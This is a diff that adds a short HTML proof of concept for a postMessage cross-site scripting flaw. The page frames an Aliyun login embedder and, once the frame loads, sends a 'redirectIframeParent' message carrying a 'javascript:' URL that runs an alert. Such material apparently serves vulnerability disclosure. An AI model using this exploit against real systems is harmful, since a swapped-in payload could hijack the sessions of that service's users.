@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PostMessage XSS</title>
+</head>
+<body>
+
+<iframe
+  id="myIframe"
+  src="https://account.aliyun.com/login/mini_login_embedder.htm?version=0.0.40&tenantName=tingwu&type=one_login"
+  width="800"
+  height="500"
+  style="border:1px solid #ccc">
+</iframe>
+
+<script>
+  const iframe = document.getElementById("myIframe");
+
+  const message2 = {
+    action: "redirectIframeParent",
+    payload: {
+      url: "javascript:alert(document.domain)"
+    }
+  };
+
+  const encodedData2 = encodeURIComponent(JSON.stringify(message2));
+
+  // Send message immediately after iframe loads
+  iframe.addEventListener("load", () => {
+    iframe.contentWindow.postMessage(encodedData2, "*");
+  });
+</script>
+
+</body>
+</html>
